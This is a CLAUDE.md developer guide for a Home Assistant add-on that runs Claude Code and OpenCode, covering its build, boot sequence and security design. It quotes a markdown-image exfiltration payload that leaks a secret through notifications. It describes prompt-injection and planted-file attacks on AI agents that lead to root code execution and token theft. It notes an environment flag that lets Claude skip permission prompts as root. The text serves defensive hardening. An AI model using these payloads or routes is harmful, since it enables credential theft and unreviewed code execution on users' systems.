# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

A Home Assistant add-on repository containing one add-on: **Claude Terminal** — Claude Code CLI in a browser terminal (ttyd + tmux), with [OpenCode](https://opencode.ai/) as a second agent in tmux window 2. The design goal is to stay thin: the add-on's job is running Claude Code reliably, not wrapping it in extra UI.

Everything shippable lives in `claude-terminal/`. The repo root holds the HA add-on repository metadata (`repository.yaml`), the Nix dev shell, and docs.

## Development Environment

```bash
nix develop        # dev shell (podman, hadolint, jq, yq-go, curl)
direnv allow       # or, if direnv is installed
```

Shell aliases: `build-addon`, `run-addon`, `lint-dockerfile`, `test-endpoint`, `validate-addon` (a no-op stub). Note `shellcheck` is **not** in the flake — install it separately or rely on CI.

### Core commands

```bash
# Build (BUILD_FROM is required — the Dockerfile has no default base)
podman build --build-arg BUILD_FROM=ghcr.io/home-assistant/amd64-base:3.23 \
  -t local/claude-terminal ./claude-terminal

# Run complete local validation suite (linting + docs drift + shell & python unit tests)
./ci/local-validate.sh

# Run unit tests directly
./tests/test_scripts.sh
python3 -m unittest discover tests/

# Lint Dockerfile & Shell scripts
hadolint ./claude-terminal/Dockerfile          # error threshold; DL3006/DL3018 ignored in CI
shellcheck -s bash -e SC1008 -e SC1091 -e SC2016 -e SC2129 -e SC1003 claude-terminal/run.sh claude-terminal/scripts/*.sh

# Run container locally + check
podman run -p 7681:7681 -v $(pwd)/config:/config local/claude-terminal
curl -X GET http://localhost:7681/
```

Automated testing is available via `./ci/local-validate.sh` and runs automatically in CI on pull requests and pushes to `main`.

## Architecture

### Add-on structure (`claude-terminal/`)
- **config.yaml** — options schema, ingress, volume maps, `image:` (prebuilt GHCR image), and the **version string that drives releases**
- **Dockerfile** — Alpine-based; all runtime packages (ttyd, tmux, nodejs, uv, ...) are baked in so startup never depends on the network
- **build.yaml** — base images per arch (amd64, aarch64) + OCI labels, consumed by `home-assistant/builder`
- **run.sh** — the boot path: environment/persistence setup, background Claude update, ttyd launch
- **scripts/** — copied to `/opt/scripts/`; `run.sh` installs most of them into `/usr/local/bin` under friendlier names
- **skills/** — Claude Code skills documenting the add-on's own tooling; copied to `/opt/skills/`, synced into `$HOME/.claude/skills` at boot. Read, never executed, so they need no `+x`
- **opencode/** — OpenCode's add-on-owned config directory (`plugins/ha-entities.js`). Copied to `/opt/opencode/` and found through `OPENCODE_CONFIG_DIR`; loaded, never executed
- **web/** — the browser side: `mobile-keys.js` (touch key bar) and `build-index.py`, which bakes it into ttyd's client at image build time. Copied to `/opt/web/`; served, never executed

### Container execution flow (`run.sh` `main()`)
1. `init_environment` — point HOME/XDG at `/data` (persistent), prepend `/data/home/.local/bin` to PATH, clean legacy npm cache, migrate legacy credentials, install `.tmux.conf`
2. `setup_commands` — install `welcome`, `persist-install`, `ha-context`, `claude-doctor` (health-check.sh), `claude-login-url`, `github-setup`, `claude-api-server` into `/usr/local/bin`; write the add-on version to `/opt/scripts/addon-version`
   `setup_opencode` (right after `setup_commands`, which installs `opencode-layers`) — write OpenCode's two config layers, export the `OPENCODE_*` environment ttyd will inherit, background `update_opencode`
3. `install_skills` — resync `/opt/skills/` into `$HOME/.claude/skills/`; `install_hooks` — rewrite the managed hook block in `$HOME/.claude/settings.json`
4. `update_claude` — validate/repair the persistent native install, then background install/update into `/data`
5. `install_persistent_packages` — apk/pip packages from add-on options **and** `/data/persistent-packages.json` (written by `persist-install`)
6. `configure_git` — sets global commit identity, configures `gh auth setup-git` if GitHub credentials exist
7. `start_automation_api` — auto-generates `/data/automation_api_token` if empty and launches background HTTP daemon (`claude-api-server.py`) on port 8128
8. `generate_ha_context` — background CLAUDE.md generation via the Supervisor API
9. `start_entity_heartbeat` — publishes the add-on's own entities and re-publishes every 5 min; `start_context_refresh` — periodic `ha-context`; `notify_ingress_advisory` — one-time security notice
10. `setup_ha_mcp` — sourced, then `configure_ha_mcp_server` registers ha-mcp with `claude mcp add`; `setup_opencode_mcp` — installs and registers the `opencode-mcp` bridge the same way (both inside `provision_async`)
11. `start_web_terminal` — `exec ttyd ... terminal-session 'claude-launch [flags]'` (or `'welcome --shell'` when `auto_launch_claude: false`). `terminal-session` creates the tmux session — window 1 Claude, window 2 `opencode-launch --wait` when OpenCode is enabled — on the first connection and attaches on every later one

### Key design rules
- **Nothing on the boot path may hit the network or block on input.** Network work (updates, context generation, MCP pre-warm) is backgrounded; packages ship in the image.
- **Everything persistent lives in `/data`** (HOME is `/data/home`). The container filesystem is recreated on every restart.
- **`/data` is included in HA backups** — never let caches or reproducible artifacts accumulate there (this is why `npm_config_cache=/tmp/npm-cache`).
- **The image owns its own patch level.** `apk upgrade` runs in the same layer as `apk add`, because the HA base image is rebuilt on its own cadence and is usually weeks behind Alpine's secdb by the time a release is cut — that lag alone accounted for 65 open CVEs. Keep it in that layer: a separate upgrade layer caches independently and would replay a stale upgrade.
- **`/usr/bin/tempio` is deleted.** The base image ships it for add-ons that render config from their options at boot; this one reads every option through `bashio::config` and sets `init: false`, so it was never invoked — while carrying 67 CVEs (Go 1.23.3 stdlib, `x/crypto` v0.26.0) that nothing in this repo could patch. If a future change genuinely needs tempio, it must be reinstalled deliberately, not by dropping the `rm`.
- **Two Claude copies exist**: the native musl binary baked into the image at `/usr/local/bin/claude` (fallback, frozen at build time, fetched straight from the npm registry — no npm/Node during build, which crashes under QEMU in aarch64 CI builds) and the native install in `/data/home/.local/bin` (persists, self-updates, wins via PATH).
- **"Installed" and "actually runs" are separate facts.** A persistent native build can be `+x` yet abort on launch (musl symbol mismatch, e.g. `posix_getdents`). Because ttyd runs `tmux new-session ... 'claude-launch'`, a broken binary kills the tmux session instantly and the user sees a blank terminal. This is guarded at **three** layers, and all three matter:
  1. **Build time** — the Dockerfile runs `ldd` on the bundled binary and fails the build on `symbol not found`. This is the only check that runs inside the build producing the shipped artifact, including `home-assistant/builder` at tag time; every CI check is a *different* build.
  2. **Boot time** — `run.sh` probes with `timeout 10 claude --version` and deletes the persistent install if it fails, **unconditionally, even when `claude_auto_update` is off**, and again after any background update.
  3. **Launch time** — `claude-launch` re-probes on every ttyd connection, falls back to the bundled copy, and degrades to `welcome --shell` with an explanation. ttyd resolves its command per connection while the boot guard runs once, so a self-update *after* boot is only covered here.
  Don't regress any of these into a bare `-x` check — presence was never the failing property.
- **Skills are shipped state, not user state.** `install_skills` clears and re-copies the bundled set on every boot, because `$HOME` is `/data` and anything written there once would otherwise outlive the release that shipped it — a withdrawn skill would keep describing commands that no longer exist. Only directories carrying `.claude-terminal-managed` are cleared, so a user's own skill (including one sharing a bundled name, which is then skipped with a warning) is never touched. A skill that documents a command must not outlive that command: `tests/test_scripts.sh` fails when a skill names a command `setup_commands` does not install.
- **`/config` is the user's home, not add-on scratch space.** `install_blueprint` writes each bundled blueprint exactly once and records a baseline copy in `/data`, so a later release can update a file nobody touched while leaving an edited one alone, and a file the user deleted is not recreated. It previously re-copied on every boot, which made the blueprint impossible to delete (it came back), impossible to harden (edits were reverted), and a source of untracked churn in any git repo kept over `/config`. Their paths are deliberately not namespaced into a vendor subdirectory — automations reference a blueprint by path, so moving one would break every automation already built from it. Baselines live in `/data/blueprint-baselines/`; `migrate_blueprint_baseline` moves the pre-wdn.18 single baseline across, because without it that blueprint looks baseline-less, which reads as "safe to overwrite" and destroys exactly the edits the baseline protects.
- **Home Assistant does not persist REST-created states.** Every entity the add-on publishes (`ha-entity`) is runtime state that Core forgets on restart. A one-shot publish therefore works until the first HA restart and then stops silently, taking any automation built on it with it — which is worse than never shipping the entities. `start_entity_heartbeat` republishes every 5 minutes and is what makes them durable. Don't "optimise" it into a boot-time publish.
- **Managed state in `$HOME/.claude` is shipped state, and shared with the user.** `settings.json` holds the user's own Claude Code settings as well as the add-on's hooks, so `claude-hooks` rewrites *only* entries whose command begins with `claude-hooks handle`, and refuses outright to touch a `settings.json` it cannot parse. Same reasoning as `install_skills`: `$HOME` is `/data`, so anything written once outlives the release that wrote it.
- **Automated paths must not double-notify.** Claude Code's `Stop` hook fires for `claude -p` too, so the Automation API and `claude-cron` both set `CLAUDE_TERMINAL_NO_HOOK_NOTIFY=1`; they report their own runs. Removing that gives every automated prompt two notifications with different wording.
- **The three places that build Claude's flags must agree.** `build_claude_flags` (run.sh), `claude_flags` (claude-cron.sh) and the options block in `claude-api-server.py` all read `dangerously_skip_permissions` and `claude_extra_args`. `claude-cron` did not, for several releases, so the same prompt worked from an automation and silently refused to change anything on a schedule.
- **`jq`'s `//` is not a null-coalesce.** It returns its right-hand side for `false` as well as `null`, so `.enabled // true` reads a disabled record back as enabled. This shipped as "a paused cron job still runs". Every boolean default in this repo is written as an explicit comparison (`if .enabled == false then …`), and `tests/test_scripts.sh` pins it.
- **Word-splitting a cron schedule also globs it.** Every field can be a literal `*`, so an unquoted split expands against the working directory — `/config` for a scheduled job — and the schedule silently matches nothing. `claude-cron`'s `safe_split` disables globbing around every split for exactly this; a test asserts it from a non-empty directory.
- **`state-lib.sh` is sourced, never executed.** Like `login-url-lib.sh`, it is absent from `setup_commands` and checked separately in `ci/smoke.sh`. Consumers are *copied* to `/usr/local/bin`, so they look for it beside `$0` **and** in `/opt/scripts` — a `dirname "$0"` lookup alone breaks the installed copy.
- **OpenCode is a second native musl binary, with the same three guards as Claude.** Build-time `ldd` check in the Dockerfile, a boot-time probe that deletes a persistent copy that cannot run, and `opencode-launch` re-probing at launch. Its own updater is off (`OPENCODE_DISABLE_AUTOUPDATE`, `autoupdate: false`): `install_opencode_native` verifies a download in `/tmp` *before* moving it onto PATH, and that must stay the only way the binary changes. amd64 uses the `baseline` build because the default one needs AVX2.
- **OpenCode's config is three layers, and the add-on never edits the user's.** OpenCode merges, lowest first: the user file (`/data/.config/opencode/opencode.json`, edited by Claude through `opencode-config`), `$OPENCODE_CONFIG` (the add-on's *defaults*: ha-mcp, HA context, LSP, MCP servers shared from Claude), then `/etc/opencode/opencode.json` (the add-on's *enforced* layer: permissions). Both add-on layers are written by `opencode-layers` on every boot and live outside `/data`, so they are shipped state. The enforced policy is "ask, except read-only tools", with the `*` rule written FIRST (OpenCode applies the last match) and repeated under each built-in agent — `explore` included, which any agent can spawn and which ships with `bash: allow` (an agent-level block outranks the global one). The same policy is also exported as `$OPENCODE_PERMISSION` from `opencode-layers policy`, because the file only helps if it was written, while the environment reaches every start path: window 2, a bare `opencode`, and the `opencode serve` the bridge launches. Gating only `edit` and `bash` left every MCP tool, ha-mcp included, unprompted.
- **ha-mcp runs in tool-search mode for OpenCode, and the policy is written for its proxies.** 78 tool definitions were ~70,000 tokens on every request; `ENABLE_TOOL_SEARCH` (option `opencode_ha_tool_search`) leaves a search tool, three call proxies and a few pinned tools. `home-assistant_ha_call_read_tool` is allowed because ha-mcp admits to it only `readOnlyHint` tools and the enumerated read actions of `manage` tools, failing closed (`transforms/categorized_search.py`, read at 7.11.0 and 8.6.0). Those allowances are conditional and fail closed (`ha_read_allowed`): only when the add-on registered ha-mcp itself, tool search is on, and the version's major is one whose proxy has been read — otherwise the same names are ordinary tools that used to ask, a user-defined `home-assistant` server, or an unread release. **Adding a major there means reading that release first.** `opencode-layers policy` computes from the *recorded* options, never the caller's environment, so `$OPENCODE_PERMISSION` cannot be wider than the file. The write and delete proxies are named explicitly as `ask`: a tidy `home-assistant_ha_call_*: allow` would allow every write ha-mcp has. A per-tool allow for a write is not expressible under the proxies, on purpose. The `review` agent is `build`'s policy plus a trailing `home-assistant_*: deny` — OpenCode drops a tool from the request only when the *last* matching rule is a deny, and appending is also what guarantees it is never looser than `build`.
- **A prompt is never the argument straight after `-p`.** There, one beginning with `-` is an option to `claude` (`--settings=…`, `--mcp-config=…` take their value in the same token), and the Assist blueprint passes typed text verbatim. `claude-api-server.py` and `claude-cron` both put it last, after `--`.
- **Model output that reaches a notification goes through `ha-notify`'s `inert`.** Notifications render markdown and an image is fetched when the drawer opens, so `![](https://elsewhere/?d=<secret>)` at the end of an injected run was a no-click leak. Images become links; links stay, because the sign-in notification is one.
- **`ha-snapshot` defaults to `/tmp/ha-snapshots`, not `/config/www`.** Home Assistant serves `/config/www` at `/local/` with no login and the filename is the camera's name.
- **`OPENCODE_DISABLE_PROJECT_CONFIG=1` is a security control, not a tidy-up.** The working directory is `/config`, and with project config on OpenCode executes what it finds there with no prompt: `.opencode/plugins/*.js` runs as root at startup, an `opencode.json` `mcp` command is launched, and an agent file can grant itself `bash: allow` over the enforced layer. All three were reproduced against the built image before this was set. `/config` takes files from git clones, HACS, restored backups and shares.
- **A project `.mcp.json` server is shared into OpenCode only if Claude Code has approved it.** `opencode-layers` reads the approval (`enabledMcpjsonServers` / `enableAllProjectMcpServers`, minus `disabledMcpjsonServers`) from `$HOME/.claude.json` and `$HOME/.claude/settings.json` only (and drops any server of any scope listed in `disabledMcpServers`) — never from a settings file inside the project, which could approve itself — and fails closed when they are unreadable. Without this, sharing was a way to run a planted command with no prompt, and the `${VAR}` → `{env:VAR}` rewrite would let it name `SUPERVISOR_TOKEN` in a header to its own URL. `dangerously_skip_permissions` is read fail-safe here — only an explicit `true` removes the prompts — the opposite direction from `build_claude_flags`, deliberately.
- **`opencode-layers` is run by two callers that cannot share an options reader.** `run.sh` has bashio; `opencode-config mcp sync` runs in the user's terminal and does not. So `write` records the option values it was given and `resync` replays them. The record is parsed, never sourced, and values are confined to `[A-Za-z0-9._-]`.
- **Two MCP names are never shared from Claude into OpenCode**: `opencode` (the bridge — OpenCode would be calling itself) and `home-assistant` (the add-on writes its own entry referencing `{env:SUPERVISOR_TOKEN}`, where `claude mcp add` stored the literal token).
- **OpenCode never starts without its policy.** `opencode-launch` checks on every start: if the enforced file is missing it relies on `$OPENCODE_PERMISSION`, and if that is missing too it applies `opencode-layers policy` itself or refuses to start. It used to print a warning and start allow-all.
- **OpenCode's `debug config` output contains resolved secrets.** It expands every `{env:}` and `{file:}` reference. `opencode-config validate` discards stdout for exactly that reason; don't print it to "help debugging".
- **An API key never appears in an argument or in `opencode.json`.** `opencode-config` takes it on stdin only, stores it in `secrets/<id>` (600) and writes a `{file:}` reference. It validates that the config is editable *before* reading the key, so a refused edit cannot orphan a secrets file. `opencode-config test` keeps the key out of the process list with a header *file* (`curl -H @file`), never a curl config (`-K`): in config syntax a newline starts a new directive and `output` is a file write, which turned one missed validation into an arbitrary write. Its input checks use `case`, not grep — grep tests each line separately, so a value with an embedded newline passed.
- **Every built-in OpenCode language server and formatter is disabled in the enforced layer.** The TypeScript server runs `node_modules/typescript/lib/tsserver.js` *from the project directory*, ESLint/oxlint run the project's own copies, formatters likewise — and OpenCode starts a server the moment it **reads** a matching file, which the policy allows without asking. A planted `/config/node_modules/typescript` ran as root with no prompt against the built image. `BUILTIN_LSP` in `opencode-layers.sh` is a denylist because OpenCode has no "custom only" switch: **when bumping OpenCode, compare it with the documented built-ins.** With `opencode_lsp` off the enforced value must be the literal `false` — an object, even an all-disabled one, turns unnamed built-ins on. Only `yaml-ls` runs, through the add-on's wrapper, at a pinned version.
- **`opencode-config` must not be a credential mover.** An LLM is told to run it, so each subcommand is assumed to be reachable by injected instructions. Hence the address guard, which went through three wrong versions before the fourth: OpenCode attaches a provider's key from this config, from its own `auth.json`, *or* from the provider's environment variable to whatever `baseURL` the config names, and trying to find and remove those credentials kept missing one (no stored URL to compare; keys outside the file; variable names that don't follow a pattern). The guard therefore does not look: a config `apiKey` overrides the other two sources (verified against the binary), so a new or changed origin without `--api-key-stdin` gets `PLACEHOLDER_KEY`, non-empty on purpose. Only an OAuth entry in `auth.json` is refused outright, since those authenticate through a request hook the option may not displace. `--api-key-env` was removed: naming any variable as "the key" for any URL is an exfiltration primitive by design. Every caller-supplied value goes through `reject_reference`, not a chosen subset of fields (OpenCode expands `{env:}`/`{file:}` anywhere, base URL and model name included); `--api-key-env` and `test` refuse the add-on's own Home Assistant tokens; `--header`/`--env` values may not contain `{env:}`/`{file:}` and their *names* are held to a header/variable-name character set (OpenCode expands references anywhere, JSON keys included — a header *named* `{env:SUPERVISOR_TOKEN}` sent the token as a header name); `test` follows a `{file:}` only inside `secrets/`; `--npm` is limited to `@ai-sdk/*` (OpenCode installs and imports it unasked); and text that comes back from an endpoint or from `/config/.mcp.json` — model ids, server names — is reduced to a safe character set before it is printed, because the agent reads that output.
- **`opencode-yaml-ls` exists because of one missing client capability.** OpenCode sends the `lsp.*.initialization` block to the server correctly, but yaml-language-server's `initialized` handler throws on workspace-folder registration (OpenCode names a folder without declaring the capability) *before* it registers its settings listeners, so `customTags` never lands and every `!secret` is an error. The wrapper declares that capability in the `initialize` request and passes everything else through. If a future OpenCode declares it itself, the wrapper becomes a no-op, not a bug.
- **The `opencode-mcp` bridge is third-party code running as root.** Exact version from `opencode_mcp_version`, `--ignore-scripts`, installed in `provision_async` (npm crashes under QEMU at build time), invoked as `node <path>` and never via `npx`. It is re-registered every boot. Don't loosen any of those; `tests/test_scripts.sh` pins three of them.
- **The entity plugin must import only `node:` builtins.** Anything else makes OpenCode run an install at startup, which needs the network. It also must dedupe: OpenCode emits `session.status: busy` many times per turn, and a subagent session going idle is not the turn ending.
- **Never let a non-essential step kill startup.** `set -e` is on, so intentional non-zero returns must be captured (`ensure_native_claude_usable || native_usable=$?`), not left bare. Since bashio 0.18 (base image, 2026-10-02) bashio also sets `inherit_errexit`, so a bare `x=$(bashio::config …)` exits the whole boot when the Supervisor API read fails — read survivable options through `config_or` or add `|| x=…`.
- **No custom session UI.** tmux `new-session -A` handles reconnects; Claude Code's own `-c`/`-r` handle continue/resume.

### Options → consumers
All options are read via `bashio::config` (from `/data/options.json`):

| Option | Read by |
|---|---|
| `auto_launch_claude` | `get_claude_launch_command` |
| `claude_auto_update` | `update_claude` |
| `claude_version` | `claude_version_pin` → `update_claude` |
| `dangerously_skip_permissions`, `claude_extra_args` | `build_claude_flags` & `claude-api-server.py`; `dangerously_skip_permissions` also `setup_opencode` → `opencode-layers` |
| `enable_opencode` | `setup_opencode`, `scripts/setup-opencode-mcp.sh`, `scripts/health-check.sh` |
| `opencode_auto_update`, `opencode_version` | `update_opencode` |
| `opencode_lsp`, `opencode_ha_tool_search` | `setup_opencode` → `opencode-layers` |
| `enable_opencode_mcp`, `opencode_mcp_version` | `scripts/setup-opencode-mcp.sh` |
| `ha_smart_context` | `generate_ha_context`, `start_context_refresh`, `setup_opencode` |
| `ha_context_refresh_hours` | `start_context_refresh` |
| `notify_on_completion`, `notify_after_seconds`, `notify_tts_target` | `scripts/claude-hooks.sh` |
| `enable_ha_entities` | `start_entity_heartbeat`, `scripts/claude-hooks.sh`, `scripts/ha-entity.sh`, `setup_opencode` (exports `CLAUDE_TERMINAL_OPENCODE_ENTITIES` for the plugin) |
| `enable_ha_mcp`, `ha_mcp_version` | `scripts/setup-ha-mcp.sh`, `setup_opencode` → `opencode-layers` |
| `enable_automation_api`, `automation_api_port`, `automation_api_key` | `start_automation_api` → `scripts/claude-api-server.py` |
| `git_user_name`, `git_user_email` | `configure_git` |
| `persistent_apk_packages`, `persistent_pip_packages` | `install_persistent_packages` |

### Notable subsystem constraints
- **Automation API**: `claude-api-server.py` runs an HTTP daemon on port 8128 (or `automation_api_port`). Authenticates via `X-API-Key` or `Authorization: Bearer <token>` matching `/data/automation_api_token` or `automation_api_key`. Restricts calls to local Docker container subnets and serializes `claude -p` execution via a process mutex lock. **Async is the mode that matters**: HA's `rest_command` defaults to a 10s timeout and almost no useful prompt fits in it, so `{"async": true}` returns 202 and fires the `claude_terminal_job_finished` event on completion. Jobs are in memory, capped at 50, lost on restart — deliberately, because `/data` is backed up and persisting every prompt and reply there would grow backups with the content of every automation. The fired event is the durable record. Rate limiting is bucketed (`run` 10/min, `poll` 120/min); sharing one bucket made async jobs unreadable by their own caller.
- **ha-mcp** requires CPython 3.13 exactly; Alpine 3.23 ships 3.12 (and 3.24 ships 3.14), so `uvx --python 3.13` provisions a managed musl build into `/data` (hence `uv` from PyPI rather than apk — Alpine's apk `uv` historically couldn't do this). `--index-strategy unsafe-best-match` is required for the HA wheels index.
- **The terminal page is ttyd's own, plus one script.** ttyd compiles its whole front end into a single `index.html` embedded (gzipped) in its binary and has no plugin surface, so `web/build-index.py` recovers that page *out of the installed binary* at build time, appends `mobile-keys.js`, and `run.sh` serves the result with `ttyd --index`. Extracting from the binary that will serve it keeps client and server in lockstep, and appending means a ttyd upgrade brings its own new client with no diff to resolve. Authoring a replacement client instead would pin the add-on to whatever xterm.js was current the day it was written. The extraction matches on *content* (a gzip stream that decompresses to HTML), never an offset, and **fails the build** when it finds none or finds two — a silent skip ships an image whose only symptom is that phones cannot type, which no boot check would catch. `run.sh` is the opposite: it only passes `--index` when the file is non-empty, because `--index` at an unreadable path makes ttyd exit, and a dead terminal for everyone is worse than a missing key bar for phone users.
- **Software keyboards have no cursor keys, Esc or Ctrl** — which is most of how Claude Code and tmux are driven. `mobile-keys.js` adds them, gated on `(pointer: coarse)` so desktop is untouched. Two things in it are load-bearing and easy to "simplify" into bugs: it dispatches synthetic `KeyboardEvent`s at xterm's `.xterm-helper-textarea` rather than writing escape bytes, so **xterm.js** decides the sequence and application cursor key mode (which both tmux and Claude's Ink UI turn on — Up is `ESC O A`, not `ESC [ A`) is handled without tracking it; and it positions against `visualViewport`, because `position: fixed` anchors to the layout viewport, which iOS does not shrink for the keyboard — a plain `bottom: 0` bar sits *behind* the keyboard. Presses also `preventDefault` so focus never leaves the terminal, which on iOS would dismiss the keyboard on every tap.
- **Clipboard**: ttyd advertises `TERM=xterm-256color`, whose terminfo lacks `Ms`, so `tmux.conf` teaches tmux the OSC 52 escape explicitly. OSC 52 truncates around ~400 chars, which is shorter than Claude's OAuth login URL — that's the entire reason `claude-login-url` exists (it captures the URL out of the session into `/config`).
- **The sign-in URL is hard-wrapped, not soft-wrapped.** Claude Code renders it through Ink, which wraps to the terminal width itself and writes each fragment as its own line; `capture-pane -J` only rejoins what the *terminal* wrapped, so it cannot put those back together and a `grep -o https://...` over the capture yields the first line alone — a well-formed, clickable, unauthorizable URL. `scripts/login-url-lib.sh` reassembles it (sourced by both `claude-login-url.sh` and `claude-login-notifier.sh`; it is not a command, so `setup_commands` does not install it and `ci/smoke.sh` checks it separately) and refuses to hand back anything still missing its `code_challenge`/`state` tail. Don't reintroduce a bare grep in either caller — `tests/test_scripts.sh` fails if you do.
- **tmux status bar** shells out to `scripts/tmux-status.sh` every 15s; it must stay fast (<1s) and needs no bashio.
- **GitHub** is the `gh` CLI from Alpine community (no MCP server). Credentials persist for free because `gh` reads `$XDG_CONFIG_HOME/gh` and `init_environment` already points `XDG_CONFIG_HOME` at `/data/.config` — don't add persistence code for it. Authentication is interactive (`github-setup`) by design: there is no token option, because `/data/options.json` is plaintext and rides along in HA backups.

### Script conventions
- `#!/usr/bin/with-contenv bashio` for boot-path scripts (`run.sh`, `setup-ha-mcp.sh`, `health-check.sh`, `persist-install.sh`)
- plain `#!/bin/bash` for scripts that run inside the user's terminal (`welcome.sh`, `ha-context.sh`, `tmux-status.sh`, `claude-login-url.sh`, `github-setup.sh`, `terminal-session.sh`, `opencode-launch.sh`, `opencode-config.sh`, `opencode-layers.sh`) — **no bashio there**; ttyd's environment doesn't provide it
- 4-space indent in shell, 2-space in YAML; credential files get 600 permissions
- Errors report via `bashio::log.error` / `bashio::log.warning` and continue

## CI & Release

Workflows in `.github/workflows/`:
- **build-test.yml** (PRs touching `claude-terminal/**`) — hadolint + amd64/aarch64 builds, then amd64 smoke tests asserting specific scripts are executable, specific binaries exist, every bundled skill shipped with valid frontmatter, the OpenCode plugin parses, and the served `index.html` still contains both ttyd's client and the key bar. **Adding a script to `scripts/`, a skill to `skills/`, a blueprint to `blueprints/`, or a required binary means updating the lists in `ci/smoke.sh`.**
- **shellcheck.yml** (PRs touching `*.sh`) — severity `warning`, `-e SC1008 -e SC1091`
- **security-scan.yml** — Trivy against the built image, on `claude-terminal/**` PRs, pushes to main and weekly. Reports HIGH/CRITICAL to the job summary, publishes **all** severities to the Security tab (the action ignores `severity:` for SARIF), and **fails** on a HIGH/CRITICAL that already has a fixed package — the one class a rebuild can act on. It is a gate, not a report: 132 alerts once accumulated across an entirely green history.
- **publish-images.yml** — on `v*` tags (and manual dispatch), builds and pushes `ghcr.io/wetdognose/{arch}-addon-claude-terminal` via `home-assistant/builder` (pinned). The Supervisor pulls these; it does not build locally.
- **release.yml** — on `v*` tags; **fails if the tag doesn't match `version:` in `config.yaml`**, and extracts release notes from the `## <version>` section of `claude-terminal/CHANGELOG.md`

## Fork layout

This repo is a fork of [heytcass/home-assistant-addons](https://github.com/heytcass/home-assistant-addons), repointed so Home Assistant runs images built from *this* tree:

- `config.yaml` `image:` and `publish-images.yml` must name the **same** GHCR namespace (`wetdognose`), or installs silently pull upstream's build instead of yours.
- The GHCR packages must be **public** — the Supervisor pulls anonymously. New packages default to private, and there is no API to change that; it's web-UI only.
- Identity is `name: "Claude Terminal (WetDogNose)"` / `slug: claude_terminal_wdn`, distinct from upstream so both can be installed side by side. **Changing the slug creates a new add-on with an empty `/data`** — a fresh Claude login.
- Versions are `<upstream base>-wdn.<n>`. The Supervisor compares version strings, so shipping new code under an unchanged version means HA never offers the update.
- Keep the `upstream` remote. Fetching is inert; divergence concentrates in `config.yaml`, `build.yaml` and `repository.yaml`, so merges stay small.

A deployable change needs, together: the code change, a bumped `version:` in `claude-terminal/config.yaml`, a matching `## <version>` section in `claude-terminal/CHANGELOG.md`, and a pushed `v<version>` tag — the tag is what both publishes the image and cuts the release. Pushing to `main` alone ships nothing.

Keep `claude-terminal/DOCS.md` (the options table and troubleshooting shown in the HA UI) in sync when options or user-facing behavior change. Note the root `DOCS.md` is an older, diverged copy.

## Local Container Testing

Full workflows are in `DEVELOPMENT.md`. The short loop:

```bash
podman build --build-arg BUILD_FROM=ghcr.io/home-assistant/amd64-base:3.23 \
  -t local/claude-terminal:test ./claude-terminal

mkdir -p /tmp/test-config /tmp/test-data
echo '{"auto_launch_claude": false}' > /tmp/test-data/options.json   # options.json lives in /data
podman run -d --name test-claude-dev -p 7681:7681 \
  -v /tmp/test-config:/config -v /tmp/test-data:/data local/claude-terminal:test

podman logs -f test-claude-dev        # then http://localhost:7681

# Hot-reload a script without rebuilding
podman cp ./claude-terminal/scripts/welcome.sh test-claude-dev:/opt/scripts/
podman exec test-claude-dev chmod +x /opt/scripts/welcome.sh

podman stop test-claude-dev && podman rm test-claude-dev
```

Outside a real Supervisor, `bashio::config` returns an **empty string** (not the default) and Supervisor-API steps (HA context, MCP, `SUPERVISOR_TOKEN`) no-op — don't read their absence as a bug. Run `claude-doctor` inside the terminal for environment/network diagnostics.

## Important Constraints

- Targets Home Assistant OS (Alpine base); **amd64 + aarch64 only** — armv7 was dropped in 2.5.0
- Credential/session persistence must survive container restarts and add-on updates
- Key env vars: `HOME=/data/home`, `ANTHROPIC_CONFIG_DIR=/data/.config/claude`, `ANTHROPIC_HOME=/data`, `IS_SANDBOX=1` (image env — lets Claude accept `--dangerously-skip-permissions` as root), `npm_config_cache=/tmp/npm-cache` (image env)
